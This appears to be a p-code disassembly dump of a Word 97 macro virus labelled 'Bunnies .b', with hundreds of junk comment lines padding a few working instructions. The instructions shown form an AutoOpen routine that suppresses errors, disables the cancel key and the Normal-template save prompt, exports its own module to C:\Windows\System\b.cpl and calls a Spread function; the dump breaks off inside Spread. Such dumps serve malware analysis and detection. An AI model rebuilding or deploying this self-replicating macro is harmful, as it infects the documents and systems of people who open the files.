' 	QuoteRem 0x0001 0x0007 "7767478"
' Line #4:
' 	QuoteRem 0x0001 0x0000 ""
' Line #5:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #6:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #7:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #8:
' 	QuoteRem 0x0001 0x0007 "7870871"
' Line #9:
' 	QuoteRem 0x0001 0x0007 "9511315"
' Line #10:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #11:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #12:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #13:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #14:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #15:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #16:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #17:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #18:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #19:
' 	QuoteRem 0x0001 0x0007 "7017760"
' Line #20:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #21:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #22:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #23:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #24:
' 	QuoteRem 0x0001 0x0000 ""
' Line #25:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #26:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #27:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #28:
' 	QuoteRem 0x0001 0x0000 ""
' Line #29:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #30:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #31:
' 	Dim (Public) 
' 	VarDefn SCode (As String)
' Line #32:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #33:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #34:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #35:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #36:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #37:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #38:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #39:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #40:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #41:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #42:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #43:
' 	QuoteRem 0x0001 0x0000 ""
' Line #44:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #45:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #46:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #47:
' 	QuoteRem 0x0001 0x0000 ""
' Line #48:
' 	QuoteRem 0x0001 0x0007 "8128949"
' Line #49:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #50:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #51:
' 	QuoteRem 0x0001 0x0007 "7894474"
' Line #52:
' 	QuoteRem 0x0001 0x0000 ""
' Line #53:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #54:
' 	QuoteRem 0x0001 0x0000 ""
' Line #55:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #56:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #57:
' 	QuoteRem 0x0001 0x0007 "1915736"
' Line #58:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #59:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #60:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #61:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #62:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #63:
' 	Dim (Public) 
' 	VarDefn stuff (As String)
' Line #64:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #65:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #66:
' 	QuoteRem 0x0001 0x0007 "9423424"
' Line #67:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #68:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #69:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #70:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #71:
' 	QuoteRem 0x0001 0x0006 "733070"
' Line #72:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #73:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #74:
' 	QuoteRem 0x0001 0x0007 "3094052"
' Line #75:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #76:
' 	QuoteRem 0x0001 0x0007 "4228845"
' Line #77:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #78:
' 	QuoteRem 0x0001 0x0007 "6633598"
' Line #79:
' 	QuoteRem 0x0001 0x0007 "8961297"
' Line #80:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #81:
' 	QuoteRem 0x0001 0x0007 "3181610"
' Line #82:
' 	QuoteRem 0x0001 0x0007 "5883879"
' Line #83:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #84:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #85:
' 	QuoteRem 0x0001 0x0000 ""
' Line #86:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #87:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #88:
' 	QuoteRem 0x0001 0x0000 ""
' Line #89:
' 	QuoteRem 0x0001 0x0000 ""
' Line #90:
' 	QuoteRem 0x0001 0x0007 "6760594"
' Line #91:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #92:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #93:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #94:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #95:
' 	QuoteRem 0x0000 0x0010 " W97T/Bunnies .b"
' Line #96:
' 	QuoteRem 0x0001 0x0007 "3348045"
' Line #97:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #98:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #99:
' 	QuoteRem 0x0001 0x0006 "430310"
' Line #100:
' 	QuoteRem 0x0001 0x0000 ""
' Line #101:
' 	QuoteRem 0x0001 0x0006 "776857"
' Line #102:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #103:
' 	QuoteRem 0x0001 0x0000 ""
' Line #104:
' 	QuoteRem 0x0001 0x0000 ""
' Line #105:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #106:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #107:
' 	QuoteRem 0x0001 0x0000 ""
' Line #108:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #109:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #110:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #111:
' 	QuoteRem 0x0001 0x0000 ""
' Line #112:
' 	QuoteRem 0x0001 0x0007 "7022424"
' Line #113:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #114:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #115:
' 	QuoteRem 0x0001 0x0007 "1696184"
' Line #116:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #117:
' 	QuoteRem 0x0001 0x0000 ""
' Line #118:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #119:
' 	QuoteRem 0x0001 0x0000 ""
' Line #120:
' 	QuoteRem 0x0001 0x0007 "2344001"
' Line #121:
' 	QuoteRem 0x0001 0x0000 ""
' Line #122:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #123:
' 	QuoteRem 0x0001 0x0000 ""
' Line #124:
' 	QuoteRem 0x0001 0x0007 "8673373"
' Line #125:
' 	QuoteRem 0x0001 0x0007 "5868956"
' Line #126:
' 	QuoteRem 0x0001 0x0007 "1205122"
' Line #127:
' 	QuoteRem 0x0000 0x0028 " Word Trojan Bunnies .b variant by Error"
' Line #128:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #129:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #130:
' 	QuoteRem 0x0001 0x0007 "9423091"
' Line #131:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #132:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #133:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #134:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #135:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #136:
' 	QuoteRem 0x0001 0x0007 "4486590"
' Line #137:
' 	QuoteRem 0x0001 0x0007 "2456407"
' Line #138:
' 	QuoteRem 0x0001 0x0000 ""
' Line #139:
' 	QuoteRem 0x0001 0x0007 "6759682"
' Line #140:
' 	QuoteRem 0x0001 0x0007 "3609875"
' Line #141:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #142:
' 	QuoteRem 0x0001 0x0000 ""
' Line #143:
' 	QuoteRem 0x0001 0x0007 "5163674"
' Line #144:
' 	QuoteRem 0x0001 0x0000 ""
' Line #145:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #146:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #147:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #148:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #149:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #150:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #151:
' 	QuoteRem 0x0001 0x0000 ""
' Line #152:
' 	QuoteRem 0x0001 0x0000 ""
' Line #153:
' 	QuoteRem 0x0001 0x0000 ""
' Line #154:
' 	QuoteRem 0x0001 0x0000 ""
' Line #155:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #156:
' 	QuoteRem 0x0001 0x0000 ""
' Line #157:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #158:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #159:
' 	FuncDefn (Sub AutoOpen())
' Line #160:
' 	QuoteRem 0x0001 0x0000 ""
' Line #161:
' 	QuoteRem 0x0001 0x0000 ""
' Line #162:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #163:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #164:
' 	QuoteRem 0x0001 0x0000 ""
' Line #165:
' 	QuoteRem 0x0001 0x0000 ""
' Line #166:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #167:
' 	QuoteRem 0x0001 0x0000 ""
' Line #168:
' 	QuoteRem 0x0001 0x0006 "352923"
' Line #169:
' 	QuoteRem 0x0001 0x0007 "4476086"
' Line #170:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #171:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #172:
' 	QuoteRem 0x0001 0x0000 ""
' Line #173:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #174:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #175:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #176:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #177:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #178:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #179:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #180:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #181:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #182:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #183:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #184:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #185:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #186:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #187:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #188:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #189:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #190:
' 	QuoteRem 0x0001 0x0000 ""
' Line #191:
' 	OnError (Resume Next) 
' Line #192:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #193:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #194:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #195:
' 	QuoteRem 0x0001 0x0000 ""
' Line #196:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #197:
' 	QuoteRem 0x0001 0x0007 "6127034"
' Line #198:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #199:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #200:
' 	QuoteRem 0x0001 0x0000 ""
' Line #201:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #202:
' 	QuoteRem 0x0001 0x0007 "8882420"
' Line #203:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #204:
' 	QuoteRem 0x0001 0x0007 "2811126"
' Line #205:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #206:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #207:
' 	QuoteRem 0x0001 0x0000 ""
' Line #208:
' 	QuoteRem 0x0001 0x0000 ""
' Line #209:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #210:
' 	QuoteRem 0x0001 0x0007 "6350671"
' Line #211:
' 	QuoteRem 0x0001 0x0000 ""
' Line #212:
' 	QuoteRem 0x0001 0x0000 ""
' Line #213:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #214:
' 	QuoteRem 0x0001 0x0007 "2553048"
' Line #215:
' 	QuoteRem 0x0001 0x0007 "3010827"
' Line #216:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #217:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #218:
' 	QuoteRem 0x0001 0x0000 ""
' Line #219:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #220:
' 	QuoteRem 0x0001 0x0000 ""
' Line #221:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #222:
' 	QuoteRem 0x0001 0x0007 "6477667"
' Line #223:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #224:
' 	QuoteRem 0x0001 0x0000 ""
' Line #225:
' 	QuoteRem 0x0001 0x0007 "9330869"
' Line #226:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #227:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #228:
' 	QuoteRem 0x0001 0x0007 "3065118"
' Line #229:
' 	QuoteRem 0x0001 0x0007 "4910523"
' Line #230:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #231:
' 	QuoteRem 0x0001 0x0000 ""
' Line #232:
' 	QuoteRem 0x0001 0x0000 ""
' Line #233:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #234:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #235:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #236:
' 	QuoteRem 0x0001 0x0007 "8751338"
' Line #237:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #238:
' 	QuoteRem 0x0001 0x0000 ""
' Line #239:
' 	QuoteRem 0x0001 0x0000 ""
' Line #240:
' 	QuoteRem 0x0001 0x0000 ""
' Line #241:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #242:
' 	QuoteRem 0x0001 0x0007 "5084797"
' Line #243:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #244:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #245:
' 	QuoteRem 0x0001 0x0007 "8581151"
' Line #246:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #247:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #248:
' 	QuoteRem 0x0001 0x0000 ""
' Line #249:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #250:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #251:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #252:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #253:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #254:
' 	QuoteRem 0x0001 0x0000 ""
' Line #255:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #256:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #257:
' 	QuoteRem 0x0001 0x0007 "2120697"
' Line #258:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #259:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #260:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #261:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #262:
' 	QuoteRem 0x0001 0x0000 ""
' Line #263:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #264:
' 	QuoteRem 0x0001 0x0000 ""
' Line #265:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #266:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #267:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #268:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #269:
' 	QuoteRem 0x0001 0x0000 ""
' Line #270:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #271:
' 	QuoteRem 0x0001 0x0007 "9088293"
' Line #272:
' 	QuoteRem 0x0001 0x0000 ""
' Line #273:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #274:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #275:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #276:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #277:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #278:
' 	QuoteRem 0x0001 0x0000 ""
' Line #279:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #280:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #281:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #282:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #283:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #284:
' 	QuoteRem 0x0001 0x0000 ""
' Line #285:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #286:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #287:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	ArgsLd Dir 0x0001 
' 	St SCode 
' Line #288:
' 	QuoteRem 0x0001 0x0007 "4101516"
' Line #289:
' 	QuoteRem 0x0001 0x0007 "5918320"
' Line #290:
' 	QuoteRem 0x0001 0x0007 "6633264"
' Line #291:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #292:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #293:
' 	QuoteRem 0x0001 0x0000 ""
' Line #294:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #295:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #296:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #297:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #298:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #299:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #300:
' 	QuoteRem 0x0001 0x0000 ""
' Line #301:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #302:
' 	QuoteRem 0x0001 0x0000 ""
' Line #303:
' 	QuoteRem 0x0001 0x0000 ""
' Line #304:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #305:
' 	QuoteRem 0x0001 0x0007 "7937999"
' Line #306:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #307:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #308:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #309:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #310:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #311:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #312:
' 	QuoteRem 0x0001 0x0007 "1700516"
' Line #313:
' 	QuoteRem 0x0001 0x0000 ""
' Line #314:
' 	QuoteRem 0x0001 0x0000 ""
' Line #315:
' 	QuoteRem 0x0001 0x0007 "7173024"
' Line #316:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #317:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #318:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #319:
' 	Ld SCode 
' 	LitStr 0x0005 "b.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Spread 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #320:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #321:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #322:
' 	QuoteRem 0x0001 0x0007 "9295762"
' Line #323:
' 	QuoteRem 0x0001 0x0000 ""
' Line #324:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #325:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #326:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #327:
' 	QuoteRem 0x0001 0x0007 "6185727"
' Line #328:
' 	QuoteRem 0x0001 0x0007 "5629221"
' Line #329:
' 	QuoteRem 0x0001 0x0007 "4062410"
' Line #330:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #331:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #332:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #333:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #334:
' 	QuoteRem 0x0001 0x0000 ""
' Line #335:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #336:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #337:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #338:
' 	QuoteRem 0x0001 0x0000 ""
' Line #339:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #340:
' 	QuoteRem 0x0001 0x0000 ""
' Line #341:
' 	QuoteRem 0x0001 0x0000 ""
' Line #342:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #343:
' 	QuoteRem 0x0001 0x0007 "8590480"
' Line #344:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #345:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #346:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #347:
' 	QuoteRem 0x0001 0x0006 "970648"
' Line #348:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #349:
' 	QuoteRem 0x0001 0x0000 ""
' Line #350:
' 	QuoteRem 0x0001 0x0000 ""
' Line #351:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Paren 
' 	LitStr 0x0008 "BunniesB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #352:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #353:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #354:
' 	QuoteRem 0x0001 0x0000 ""
' Line #355:
' 	QuoteRem 0x0001 0x0007 "1851448"
' Line #356:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #357:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #358:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #359:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #360:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #361:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #362:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #363:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #364:
' 	QuoteRem 0x0001 0x0007 "2450234"
' Line #365:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #366:
' 	QuoteRem 0x0001 0x0007 "5108979"
' Line #367:
' 	QuoteRem 0x0001 0x0000 ""
' Line #368:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #369:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #370:
' 	QuoteRem 0x0001 0x0007 "8390446"
' Line #371:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #372:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #373:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #374:
' 	QuoteRem 0x0001 0x0007 "2577230"
' Line #375:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #376:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #377:
' 	QuoteRem 0x0001 0x0007 "6463077"
' Line #378:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #379:
' 	QuoteRem 0x0001 0x0000 ""
' Line #380:
' 	QuoteRem 0x0001 0x0000 ""
' Line #381:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #382:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #383:
' 	ArgsCall (Call) Spread 0x0000 
' Line #384:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #385:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #386:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #387:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #388:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #389:
' 	QuoteRem 0x0001 0x0007 "1526576"
' Line #390:
' 	QuoteRem 0x0001 0x0007 "3326949"
' Line #391:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #392:
' 	QuoteRem 0x0001 0x0007 "7382650"
' Line #393:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #394:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #395:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #396:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #397:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #398:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #399:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #400:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #401:
' 	QuoteRem 0x0001 0x0000 ""
' Line #402:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #403:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #404:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #405:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #406:
' 	QuoteRem 0x0001 0x0007 "6145377"
' Line #407:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #408:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #409:
' 	QuoteRem 0x0001 0x0000 ""
' Line #410:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #411:
' 	QuoteRem 0x0001 0x0007 "2138128"
' Line #412:
' 	QuoteRem 0x0001 0x0000 ""
' Line #413:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #414:
' 	QuoteRem 0x0001 0x0000 ""
' Line #415:
' 	EndSub 
' Line #416:
' 	QuoteRem 0x0001 0x0000 ""
' Line #417:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #418:
' 	QuoteRem 0x0001 0x0000 ""
' Line #419:
' 	QuoteRem 0x0001 0x0007 "3272920"
' Line #420:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #421:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #422:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #423:
' 	QuoteRem 0x0001 0x0007 "3424502"
' Line #424:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #425:
' 	QuoteRem 0x0001 0x0007 "5713025"
' Line #426:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #427:
' 	QuoteRem 0x0001 0x0007 "5677673"
' Line #428:
' 	QuoteRem 0x0001 0x0007 "9557926"
' Line #429:
' 	QuoteRem 0x0001 0x0000 ""
' Line #430:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #431:
' 	QuoteRem 0x0001 0x0000 ""
' Line #432:
' 	QuoteRem 0x0001 0x0006 "823801"
' Line #433:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #434:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #435:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #436:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #437:
' 	QuoteRem 0x0001 0x0000 ""
' Line #438:
' 	QuoteRem 0x0001 0x0007 "5887299"
' Line #439:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #440:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #441:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #442:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #443:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #444:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #445:
' 	QuoteRem 0x0001 0x0007 "4451237"
' Line #446:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #447:
' 	FuncDefn (Function Spread())
' Line #448:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #449:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #450:
' 	QuoteRem 0x0001 0x0000 ""
' Line #451:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #452:
' 	QuoteRem 0x0001 0x0008 "12:15:34"
' Line #453:
' 	QuoteRem 0x0001 0x0000 ""
' Line #454:
' 	QuoteRem 0x0001 0x0000 ""
' Line #455:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #456:
' 	QuoteRem 0x0001 0x0000 ""
' Line #457:
' 	QuoteRem 0x0001 0x0007 "6466830"
' Line #458:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #459:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #460:
